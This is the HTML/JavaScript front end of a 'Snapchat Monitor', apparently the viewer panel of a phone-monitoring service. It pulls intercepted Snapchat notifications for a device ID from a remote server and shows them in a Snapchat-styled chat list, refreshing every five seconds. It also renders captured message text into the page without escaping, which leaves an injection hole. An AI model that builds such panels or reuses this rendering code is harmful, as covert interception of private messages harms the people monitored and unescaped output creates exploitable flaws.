<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Snapchat Monitor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- SNAPCHAT THEME CSS --- */
        body { 
            margin: 0; 
            background-color: #f2f2f2; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; 
            height: 100vh; 
            overflow: hidden; 
            display: flex;
            justify-content: center;
        }

        .app-container {
            width: 100%;
            height: 100%;
            max-width: 450px;
            background-color: #fff;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            display: flex;
            flex-direction: column;
        }

        /* --- VIEW 1: CHAT LIST --- */
        #snapListScreen { display: flex; flex-direction: column; height: 100%; width: 100%; }
        
        .snap-header { 
            background: #fff; 
            padding: 10px 15px; 
            border-bottom: 1px solid #f0f0f0; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            height: 50px;
        }
        .header-left { display: flex; align-items: center; gap: 10px; cursor: pointer; }
        .avatar-small { width: 38px; height: 38px; background: #eee; border-radius: 50%; overflow: hidden; }
        .page-title { font-weight: 700; font-size: 1.2rem; color: #000; }
        .header-right { display: flex; gap: 15px; color: #000; font-size: 1.2rem; }

        .friend-list { flex: 1; overflow-y: auto; }
        
        .friend-row { 
            display: flex; align-items: center; 
            padding: 10px 15px; 
            border-bottom: 1px solid #fafafa; 
            cursor: pointer; 
            height: 60px;
        }
        .friend-row:active { background: #f8f8f8; }

        .bitmoji { width: 48px; height: 48px; margin-right: 12px; border-radius: 50%; background: #f0f0f0; overflow: hidden; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: #ccc; }
        
        .friend-data { flex: 1; display: flex; flex-direction: column; justify-content: center; overflow: hidden; }
        .friend-data h3 { margin: 0; font-size: 1.05rem; font-weight: 500; color: #000; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        
        .status-row { display: flex; align-items: center; gap: 8px; margin-top: 4px; }
        .status-icon { width: 12px; height: 12px; border-radius: 3px; display: inline-block; }
        
        /* Status Colors */
        .st-red { background-color: #f23c57; border: 1px solid #f23c57; } /* Snap */
        .st-blue { background-color: #3cb2e2; border-radius: 50%; width: 12px; height: 12px;} /* Chat */
        .st-purple { background-color: #9b55a0; border-radius: 50%; } /* Video */
        
        .st-text { font-size: 0.8rem; color: #888; font-weight: 400; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden; }
        .st-time { font-size: 0.75rem; color: #bbb; margin-left: 5px; border-left: 1px solid #eee; padding-left: 5px;}

        .cam-btn { 
            width: 40px; height: 40px; border-radius: 50%; 
            display: flex; justify-content: center; align-items: center; 
            color: #ccc; font-size: 1.2rem; border-left: 1px solid #fafafa;
        }

        /* --- VIEW 2: CHAT CONVERSATION --- */
        #snapChatScreen { 
            display: none; 
            flex-direction: column; height: 100%; 
            background: #fff; 
            position: absolute; top: 0; left: 0; width: 100%; 
            z-index: 20; 
        }
        
        .chat-top { 
            padding: 10px; border-bottom: 1px solid #f0f0f0; 
            display: flex; align-items: center; gap: 10px; height: 50px;
        }
        .chat-name { font-weight: 700; font-size: 1.1rem; flex: 1; color: #000; }
        
        .snap-msgs { 
            flex: 1; padding: 15px; overflow-y: auto; 
            display: flex; flex-direction: column; gap: 4px; 
        }
        
        .s-msg { 
            padding: 8px 12px; 
            max-width: 75%; 
            font-size: 1rem; 
            position: relative;
            background: #fcfcfc;
            color: #333;
            border-left: 3px solid #3cb2e2; /* Default Chat Color */
        }
        
        .s-in { align-self: flex-start; }
        .s-time-float { font-size: 0.65rem; color: #aaa; margin-top: 4px; display: block;}

        .chat-bottom { padding: 10px; border-top: 1px solid #eee; display: flex; align-items: center; gap: 10px; background: #fff; }
        .snap-input { flex: 1; background: #eee; border: none; padding: 12px 20px; border-radius: 20px; outline: none; }

        .bottom-nav { 
            height: 60px; border-top: 1px solid #eee; display: flex; justify-content: space-around; align-items: center; background: #fff; opacity: 0.8; 
        }
        .nav-item { font-size: 1.4rem; color: #ccc; }
        .nav-active { color: #3cb2e2; }

    </style>
</head>
<body>

    <div class="app-container">

        <div id="snapListScreen">
            <div class="snap-header">
                <div class="header-left" onclick="window.location.href='index.html'">
                     <div class="avatar-small">
                        <div style="width:100%; height:100%; background:#FFFC00; display:flex; justify-content:center; align-items:center;">ðŸ‘»</div>
                    </div>
                    <i class="fa-solid fa-magnifying-glass" style="color:#666; font-size:1.1rem; margin-left:10px;"></i>
                </div>
                <div class="page-title">Chat</div>
                <div class="header-right">
                    <i class="fa-solid fa-user-plus"></i>
                    <i class="fa-solid fa-ellipsis"></i>
                </div>
            </div>

            <div class="friend-list" id="snapContainer">
                <div style="display:flex; justify-content:center; align-items:center; height:200px; color:#ccc;">
                    <i class="fa-solid fa-ghost fa-bounce" style="font-size:2rem; margin-right:10px;"></i> Loading...
                </div>
            </div>

            <div class="bottom-nav">
                <div class="nav-item"><i class="fa-solid fa-location-dot"></i></div>
                <div class="nav-item nav-active"><i class="fa-regular fa-comment"></i></div>
                <div class="nav-item"><i class="fa-solid fa-camera" style="font-size:1.8rem; color:#FFFC00; -webkit-text-stroke: 1px #ccc;"></i></div>
                <div class="nav-item"><i class="fa-solid fa-user-group"></i></div>
                <div class="nav-item"><i class="fa-solid fa-play"></i></div>
            </div>
        </div>

        <div id="snapChatScreen">
            <div class="chat-top">
                <i class="fa-solid fa-chevron-left" style="font-size:1.5rem; color:#000; cursor:pointer; padding:5px;" onclick="closeSnap()"></i>
                <div class="bitmoji" style="width:35px; height:35px; font-size:1rem; margin-right:5px;">ðŸ‘»</div>
                <div class="chat-name" id="snapName">Friend</div>
                <i class="fa-solid fa-phone" style="font-size:1.1rem; color:#666; margin-right:15px; background:#f0f0f0; padding:8px; border-radius:50%"></i>
                <i class="fa-solid fa-video" style="font-size:1.1rem; color:#666; background:#f0f0f0; padding:8px; border-radius:50%"></i>
            </div>
            
            <div class="snap-msgs" id="snapMsgsBox">
            </div>

            <div class="chat-bottom">
                <i class="fa-solid fa-camera" style="color:#000; font-size:1.2rem; background:#f0f0f0; padding:8px; border-radius:50%"></i>
                <input type="text" class="snap-input" placeholder="Send a chat">
                <i class="fa-solid fa-microphone" style="color:#000; font-size:1.2rem;"></i>
            </div>
        </div>

    </div>

    <script>
        // --- CONFIG & LOGIC ---
        const DEVICE_ID = localStorage.getItem('monitoring_id');
        const BASE_URL = "https://child-v9no.onrender.com/api/get-data";
        
        // Request specific 'snapchat' file
        const DATA_TYPE = "snapchat";

        if (!DEVICE_ID) {
            alert("Device ID missing! Redirecting...");
            window.location.href = 'index.html'; 
        }

        let groupedSnaps = {};

        // 1. Fetch Data
        async function fetchSnapData() {
            try {
                // Endpoint: /api/get-data/ID/snapchat
                const response = await fetch(`${BASE_URL}/${DEVICE_ID}/${DATA_TYPE}`);
                const result = await response.json();

                if (Array.isArray(result) && result.length > 0) {
                    processSnapData(result);
                } else {
                    document.getElementById('snapContainer').innerHTML = "<p style='text-align:center; padding:20px; color:#ccc'>No Chats Found</p>";
                }
            } catch (error) {
                console.error("Error fetching data:", error);
            }
        }

        // 2. Process & Group Data
        function processSnapData(logs) {
            groupedSnaps = {};

            // Sort by time ascending (Old -> New)
            logs.sort((a, b) => (a.time || 0) - (b.time || 0));

            logs.forEach(log => {
                let rawTitle = (log.title || "").trim();
                let rawText = (log.text || "").trim();
                let time = log.time || Date.now();

                // Garbage collection
                if(rawText.includes("is typing") || rawText.includes("Updating")) return;

                let senderName = "Unknown";
                let messageBody = rawText;

                // --- LOGIC: NAME DETECTION ---
                // Snap Notifications often come as Title: "Snapchat", Text: "Rahul sent you a chat"
                if (rawTitle === "Snapchat") {
                    if (rawText.includes(":")) {
                        // "Rahul: Hello there"
                        let parts = rawText.split(":");
                        senderName = parts[0].trim();
                        messageBody = parts.slice(1).join(":").trim();
                    } else if (rawText.toLowerCase().includes("snap")) {
                         // "New Snap from Rahul" -> System Notification bucket
                         senderName = "Snap Notifications";
                    } else {
                        senderName = "Snap Notifications";
                    }
                } else {
                    // Title is "Rahul"
                    senderName = rawTitle;
                }

                if (!groupedSnaps[senderName]) {
                    groupedSnaps[senderName] = {
                        name: senderName,
                        lastMsg: "",
                        lastTime: 0,
                        msgs: []
                    };
                }

                groupedSnaps[senderName].msgs.push({
                    text: messageBody,
                    timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
                });

                groupedSnaps[senderName].lastMsg = messageBody;
                groupedSnaps[senderName].lastTime = time;
            });

            renderSnaps();
        }

        // 3. Render List
        function renderSnaps() {
            const con = document.getElementById('snapContainer');
            const users = Object.keys(groupedSnaps);
            
            if(users.length === 0) {
                con.innerHTML = "<p style='text-align:center; padding:20px; color:#ccc'>No Data</p>";
                return;
            }

            // Sort: Newest chats at top
            users.sort((a, b) => groupedSnaps[b].lastTime - groupedSnaps[a].lastTime);

            let html = "";
            users.forEach(user => {
                const s = groupedSnaps[user];
                
                // Styling based on message type
                let statusClass = "st-blue"; // Default Chat (Blue)
                let statusText = "New Chat";
                
                if (user === "Snap Notifications") {
                    statusClass = "st-red"; // Red for system snaps
                    statusText = "New Snap";
                }

                html += `
                    <div class="friend-row" onclick="openSnap('${user}')">
                        <div class="bitmoji">
                            ${user === "Snap Notifications" ? '<i class="fa-solid fa-bell" style="font-size:1.2rem"></i>' : 'ðŸ‘»'}
                        </div>
                        <div class="friend-data">
                            <h3>${s.name}</h3>
                            <div class="status-row">
                                <span class="status-icon ${statusClass}"></span>
                                <span class="st-text">
                                    ${statusText} â€¢ ${s.lastMsg}
                                </span>
                                <span class="st-time">${new Date(s.lastTime).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
                            </div>
                        </div>
                        <div class="cam-btn"><i class="fa-regular fa-comment-dots"></i></div>
                    </div>`;
            });
            con.innerHTML = html;
        }

        // 4. Open Chat
        function openSnap(userName) {
            const s = groupedSnaps[userName];
            
            if(s) {
                document.getElementById('snapName').innerText = s.name;
                const box = document.getElementById('snapMsgsBox');
                box.innerHTML = "";
                
                s.msgs.forEach(m => {
                    // Logic to change color: if it contains "New Snap" make it Red/Bold, else Blue msg
                    let borderStyle = "border-left: 3px solid #3cb2e2;";
                    if(m.text.toLowerCase().includes("snap")) borderStyle = "border-left: 3px solid #f23c57;";

                    box.innerHTML += `
                        <div class="s-msg s-in" style="${borderStyle}">
                            ${m.text}
                            <span class="s-time-float">${m.timeStr}</span>
                        </div>`;
                });

                document.getElementById('snapListScreen').style.display = 'none';
                document.getElementById('snapChatScreen').style.display = 'flex';
                box.scrollTop = box.scrollHeight;
            }
        }

        function closeSnap() {
            document.getElementById('snapChatScreen').style.display = 'none';
            document.getElementById('snapListScreen').style.display = 'flex';
        }

        // Auto Refresh
        fetchSnapData();
        setInterval(fetchSnapData, 5000);

    </script>
</body>
</html>
